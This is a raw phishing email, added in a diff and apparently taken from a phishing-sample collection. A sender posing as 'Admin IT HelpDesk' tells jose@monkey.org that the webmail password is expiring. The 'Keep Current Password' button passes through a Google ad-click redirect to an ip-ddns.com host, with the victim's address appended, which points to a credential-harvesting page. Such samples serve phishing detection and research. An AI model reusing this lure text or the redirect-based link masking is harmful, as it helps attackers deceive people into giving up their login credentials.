@@ -1,0 +1,325 @@
+Return-Path: info@s1serv00431.cc
+Delivered-To: jose@monkey.org
+X-FDA: 83662160820.12.CD78FAA
+Received: from s1serv00431.cc (s1serv00431.cc [198.23.221.62])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id 3543880003
+	for <jose@monkey.org>; Mon, 14 Jul 2025 08:15:29 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=pass header.d=s1serv00431.cc header.s=re1 header.b=W006CoeV;
+	dmarc=pass (policy=none) header.from=s1serv00431.cc;
+	spf=pass (imf11.b.hostedemail.com: domain of info@s1serv00431.cc designates
+ 198.23.221.62 as permitted sender) smtp.mailfrom=info@s1serv00431.cc
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1752480929; a=rsa-sha256;
+	cv=none;
+	b=7rkokoOPY9dqD7WwNOSBB5ZZoWedgXU3PnZf7/sg6mZiRLyVMP9c92z0dH7oJyMPnAwj+m
+	CROGlEpWkPsykmTfbJWNBM3rH6Vvr8vqJsUwAtj6D0YxlWdnTwagWcrb/iifeYuRaXOJbb
+	CgWK/28sV84NjR4iR6QSUJgxemsuVag=
+ARC-Authentication-Results: i=1;
+	imf11.b.hostedemail.com;
+	dkim=pass header.d=s1serv00431.cc header.s=re1 header.b=W006CoeV;
+	dmarc=pass (policy=none) header.from=s1serv00431.cc;
+	spf=pass (imf11.b.hostedemail.com: domain of info@s1serv00431.cc designates
+ 198.23.221.62 as permitted sender) smtp.mailfrom=info@s1serv00431.cc
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1752480929;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=gHwZmerY4oXmswEwiGZvSm/3qoIYWGJ+6Zt+wGdjcGk=;
+	b=oFGysqkV5V4IYHleCBMxbKqCtXShs1p+kLtU8M1OTJBWdVHZmgg7TOpMItBYaf7KAAdi6H
+	fpGKUqikpz2JmBcuRUyWcDYLXXcsVOu+vufEDsikfQvx6sKpJAaGO5dCWZZMZQSzxTPjHx
+	qRh12oVncXJi1sKcYvwwb7wE1qDzQCw=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=re1; d=s1serv00431.cc;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@s1serv00431.cc;
+ bh=gHwZmerY4oXmswEwiGZvSm/3qoIYWGJ+6Zt+wGdjcGk=;
+ b=W006CoeV9fhNYxjccYvhU9NcUxa4082E+tGPkhEM56FGirwL6njhHb5IqV3AO+S5XS8TfRyGLPzX
+   BKzJOI4snsk3CsU/Q+CO+v+rojZhSisP1VjTZXJLP59MPyBX2ArFWFKRR6ggAK9oX+L4yU5NjEBJ
+   RFuikXYVJTk8raelXy4Kerc/IBHJe1eEQ2nEfmDY9biD8ejOqb65bYEAXs+5dQdPJ72BsoePdLoz
+   LfAgX8qn8rlN5Tr5aA24Oks/n7/WA8K8IMYt3TIzFZmZVfDAIH/Lal3bqaMqhoqF0DhgMb8IJpU0
+   mE2RwIkWEHWdpZC6sPZotnAlG/oiQqdkvEVPDw==
+From: "Admin IT HelpDesk" <info@s1serv00431.cc>
+To: jose@monkey.org
+Subject: Password for jose@monkey.org Expires
+Date: 14 Jul 2025 01:15:26 -0700
+Message-ID: <20250714011526.CE04AB5075E3D3E0@s1serv00431.cc>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam06
+X-Rspam-User: 
+X-Stat-Signature: 3pyptn5kdymt9pf1c4nqbq8nikesmhws
+X-Rspamd-Queue-Id: 3543880003
+X-Spam-Status: No, score=1.30
+X-HE-Tag: 1752480929-102292
+X-HE-Meta: 
+ U2FsdGVkX1/HwvUKEckLoOT7AqwtGk0DuxiBwnRokHYHcKaLPwOMX4sbdabJ5+Lit6MMQaYO/m/Yrvm+pTikbWO62Q5APeJVhtf+HYGN0i37jyI//RGUSuPlqLTnzUgVgM+TQb+SJciI29LMP+rF7JEZ94Ch2zYYrr3cAcOSuB4jUfhVqB70sgy4iHlmGiGjtFfhf8PDjOSVrpczOjuHqOPGk7zt1Bd2b27lp5N9feIP4EbaChATY0NCXEQ9u6bnxnTLKLkAFg0+viSC+kDklBW4eoNC6c5jGDAjmnJwq64kHJqhuFNCgaxDuxIww/9IqfXxSyq6uGIaBBJst4s/gdZIL+gP1GxD2LTyMiaFcJy1umRM1ZRzrmXYz4RRt3V++a1uAqyZ4brzpxstr9HukOV3R3fycKh7JTEU3WEWQ6kGxDWUF0W5QraHYqkyKgd1ukNqTUIJc6U+YdOZVoONmnlRhd2MCLycBBqZJNaBVNeESsmqUvzHhtNXOO1GFBE0xbkvn710olcZ8Yj8yfvvbDw0jD4n/ggUN1b0CLe/1Tep6n5gZkk4U7MJi8WqyEHpR9DreTOZ4klJhgpMT7i01SkC4mHEBpvQnEMZRb/oE0AcoZEpCpCU8lrQDKYO0/vUpd8/G5UN698nFbPUCyUgREsU23EtN3QDErN8+IESUDKnigrLZUtvA04OsAoRLE67W0f10fiaThzmG10RswgAGYAt+F22PrGuDEIMiE0NZ7QcRPBVl7LApRve87jBgEMlgpG2bkE2SazW40AGQ8t/C8qyGz/pAhDQRoWJdcRzK+v4u+Xua/INMuZgmN9eQehcD3ZVB0ccZBsbuZVHDCcTcbCNY5S+/mLR4d4Ymt1tdXbbDsv3ksHsILRcvkbQ2/8Ogz1eWw/OvBxK603Kzd1oldXXElkhXPIT/QhMZOBY3kXQwDDd2fqCu2A5vK+hVqtsa5i3rBV64IVH6lB6ZhE1d5dPD/C
+ PWItxvi/sqnAfjxk1VNLlTZSBZtOvo46fwdfCi58nb2sRyB/J7BnUc3R4U3Yn1r68VFmDzozgTRKOdb75xYwUc65Z3EJc5CPaAaDmj4vf78eWTHu8Y5pNBhbIc7ju+EJko+CDW6bbfpMrlQ5eIyi7L3X4peqir95fIzMFsCWd7jPluZFI8qxsP1cDY68a137WBVOOi3V1CiSsYtrVyot2Q0A4LT/npAZPF6vEHX0pkfOgAhPMSFcmGtRnZV2KR0bEzoWUCofVvDPyRNfHZIomDquo94Qn6APcWV1sU1WiTXNxRC5lcemeFIIiBMqqciOQsyMJ/iDs27T1/g6zMlBvDFylSgUOyfVjFoLJKS6AcNUJpO0g2bE1O9VULOyea12DNk0bvdbroaQ/Noyt/Yb5ISN2giKuV093Ch2QrlGYVriUgNEYkFg2JIJAY6jvKUu6+V6fZDIL7p771vYx5Z86YETAPYDVjqps2WiTUPsFriP5rAFeiYab8psVcLYst7Y2JxNzv2ulgLbrFPwMGYFJu7wpCQy3LdYEkAF490Jl+X9WVyVhTKzlawdbSOIqrJgjwnXV8tPU0Yd1SaU=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 289
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org=
+/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html class=3D"sg-campaigns" data-editor-version=3D"2" xmlns=3D"http://www.=
+w3.org/1999/xhtml"><head>
+      <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf=
+-8">
+      <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scal=
+e=3D1, minimum-scale=3D1, maximum-scale=3D1">
+      <!--[if !mso]><!-->
+      <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3DEdge">
+      <!--<![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+      <xml>
+        <o:OfficeDocumentSettings>
+          <o:AllowPNG/>
+          <o:PixelsPerInch>96</o:PixelsPerInch>
+        </o:OfficeDocumentSettings>
+      </xml>
+      <![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+  <style type=3D"text/css">
+    body {width: 600px;margin: 0 auto;}
+    table {border-collapse: collapse;}
+    table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
+    img {-ms-interpolation-mode: bicubic;}
+  </style>
+<![endif]-->
+      <style type=3D"text/css">
+    body, p, div {
+      font-family: arial,helvetica,sans-serif;
+      font-size: 14px;
+    }
+    body {
+      color: #000000;
+    }
+    body a {
+      color: #1188E6;
+      text-decoration: none;
+    }
+    p { margin: 0; padding: 0; }
+    table.wrapper {
+      width:100% !important;
+      table-layout: fixed;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      -moz-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+    }
+    img.max-width {
+      max-width: 100% !important;
+    }
+    .column.of-2 {
+      width: 50%;
+    }
+    .column.of-3 {
+      width: 33.333%;
+    }
+    .column.of-4 {
+      width: 25%;
+    }
+    @media screen and (max-width:480px) {
+      .preheader .rightColumnContent,
+      .footer .rightColumnContent {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent div,
+      .preheader .rightColumnContent span,
+      .footer .rightColumnContent div,
+      .footer .rightColumnContent span {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent,
+      .preheader .leftColumnContent {
+        font-size: 80% !important;
+        padding: 5px 0;
+      }
+      table.wrapper-mobile {
+        width: 100% !important;
+        table-layout: fixed;
+      }
+      img.max-width {
+        height: auto !important;
+        max-width: 100% !important;
+      }
+      a.bulletproof-button {
+        display: block !important;
+        width: auto !important;
+        font-size: 80%;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+      }
+      .columns {
+        width: 100% !important;
+      }
+      .column {
+        display: block !important;
+        width: 100% !important;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+      }
+      .social-icon-column {
+        display: inline-block !important;
+      }
+    }
+  </style>
+      <!--user entered Head Start--><!--End Head user entered-->
+    </head>
+    <body style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px; color: #000000">
+      <center class=3D"wrapper" data-link-color=3D"#1188E6" data-body-style=
+=3D"font-size:14px; font-family:arial,helvetica,sans-serif; color:#000000; =
+background-color:#ffffff;">
+        <div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px" class=3D"webkit">
+          <table style=3D"width:100% !important;
+      table-layout: fixed;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      -moz-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%" width=3D"100%" class=3D"wrapper" bgcolor=
+=3D"#ffffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+            <tbody><tr>
+              <td width=3D"100%" valign=3D"top" bgcolor=3D"#ffffff">
+                <table width=3D"100%" align=3D"center" class=3D"outer" role=
+=3D"content-container" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody><tr>
+                    <td width=3D"100%">
+                      <table width=3D"100%" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+                        <tbody><tr>
+                          <td>
+                            <!--[if mso]>
+    <center>
+    <table><tr><td width=3D"600">
+  <![endif]-->
+                                    <table width=3D"100%" align=3D"center" =
+style=3D"width: 100%; max-width: 600px;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0">
+                                      <tbody><tr>
+                                        <td width=3D"100%" align=3D"left" r=
+ole=3D"modules-container" style=3D"padding: 0px; text-align: left; color: r=
+gb(0, 0, 0);" bgcolor=3D"#ffffff"><table width=3D"100%" class=3D"module pre=
+header preheader-hide" role=3D"module" style=3D"width: 0px; height: 0px; co=
+lor: transparent; display: none !important; visibility: hidden; opacity: 0;=
+ mso-hide: all;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" data-type=
+=3D"preheader">
+    <tbody><tr>
+      <td role=3D"module-content">
+        <p style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0; padding: 0"></p>
+      </td>
+    </tr>
+  </tbody></table><table width=3D"100%" class=3D"module" role=3D"module" st=
+yle=3D"table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+0" data-type=3D"text" data-muid=3D"3702495e-0239-457f-9f5a-6a4479fda420">
+    <tbody>
+      <tr>
+        <td height=3D"100%" role=3D"module-content" valign=3D"top" style=3D=
+"padding: 18px 0px; text-align: inherit; line-height: 22px;" bgcolor=3D""><=
+div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"><div style=3D"font-family: arial,helvetica,sans-seri=
+f;
+      font-size: 14px; text-align: center; font-family: inherit;"><span sty=
+le=3D"color: rgb(255, 34, 0); font-size: 36px;"><strong>Webmail</strong></s=
+pan></div><div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"></div></div></td>
+      </tr>
+    </tbody>
+  </table><table width=3D"100%" class=3D"module" role=3D"module" style=3D"t=
+able-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" data-=
+type=3D"text" data-muid=3D"408e1b03-0c83-45d8-aaa4-0840a1db443f">
+    <tbody>
+      <tr>
+        <td height=3D"100%" role=3D"module-content" valign=3D"top" style=3D=
+"padding: 18px 0px 18px 10px; text-align: inherit; line-height: 22px;" bgco=
+lor=3D""><div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"><div style=3D"font-family: arial,helvetica,sans-seri=
+f;
+      font-size: 14px; text-align: center; font-family: inherit;">Password =
+for jose@monkey.org is about to expire,<br>
+You can change your Password or continue using current Password.</div><div =
+style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"></div></div></td>
+      </tr>
+    </tbody>
+  </table><table width=3D"100%" class=3D"module" role=3D"module" style=3D"t=
+able-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" data-=
+type=3D"button" data-muid=3D"d57cf897-7530-431b-bd2d-0c4b34f13fc5" data-rol=
+e=3D"module-button">
+      <tbody>
+        <tr>
+          <td align=3D"center" class=3D"outer-td" style=3D"padding: 0px;" b=
+gcolor=3D"">
+            <table class=3D"wrapper-mobile" style=3D"text-align: center;" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+              <tbody>
+                <tr>
+                <td align=3D"center" class=3D"inner-td" style=3D"border-rad=
+ius: 6px; text-align: center; font-size: 16px; background-color: inherit;" =
+bgcolor=3D"#ff2200">
+                  <a style=3D"padding: 12px 18px; border-radius: 0px; borde=
+r: 1px solid rgb(255, 34, 0); border-image: none; text-align: center; color=
+: rgb(255, 255, 255); line-height: 6px; letter-spacing: 0px; font-size: 14p=
+x; font-weight: normal; text-decoration: none; display: inline-block; backg=
+round-color: rgb(255, 34, 0);"=20
+href=3D"https://googleads.g.doubleclick.net/pcs/click?xai=3DAKAOjssIdZGtK2L=
+Gw4coQMwtQcONuf8cVZUVHUrlFgT3_wiLCuxpoweUvHdBH9neY4iW-CZh2SzgITptx6j64F0B2p=
+EU0uoeRfmKTeyn7LSG5Irubqjv6IFl9MeqTp84ZT99WRJlZDMgrwUaUI7QjgNwL22AVveJm980w=
+uVNryiILT2WhxCPmcY8MPVIOygXT_382p7PUn7bIByn2OjlTfCiaqta3tAhZWCuROeXZPznm5cG=
+hgUYspVywPb8Y8GbuT5pyEUyF89icmqe5zg&amp;sig=3DCg0ArKJSzFtr0kI2Y6Ll&amp;adur=
+l=3Dhttps://soloqmdlyp41f8c932aeb7c91fbdde3aloa.ip-ddns.com/#jose@monkey.or=
+g" target=3D"_blank">Keep Current Password</a>
+                </td>
+                </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+      </tbody>
+    </table><table width=3D"100%" class=3D"module" role=3D"module" style=3D=
+"table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" dat=
+a-type=3D"text" data-muid=3D"5f8b1a3a-acac-4b04-bbb0-4077f000dc08">
+    <tbody>
+      <tr>
+        <td height=3D"100%" role=3D"module-content" valign=3D"top" style=3D=
+"padding: 18px 0px; text-align: inherit; line-height: 22px;" bgcolor=3D""><=
+div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"><div style=3D"font-family: arial,helvetica,sans-seri=
+f;
+      font-size: 14px; text-align: center; font-family: inherit;">jose@monk=
+ey.org support</div><div style=3D"font-family: arial,helvetica,sans-serif;
+      font-size: 14px"></div></div></td>
+      </tr>
+    </tbody>
+  </table></td>
+                                      </tr>
+                                    </tbody></table>
+                                    <!--[if mso]>
+                                  </td>
+                                </tr>
+                              </table>
+                            </center>
+                            <![endif]-->
+                          </td>
+                        </tr>
+                      </tbody></table>
+                    </td>
+                  </tr>
+                </tbody></table>
+              </td>
+            </tr>
+          </tbody></table>
+        </div>
+      </center>
+=20=20=20=20
+  </body></html>
+
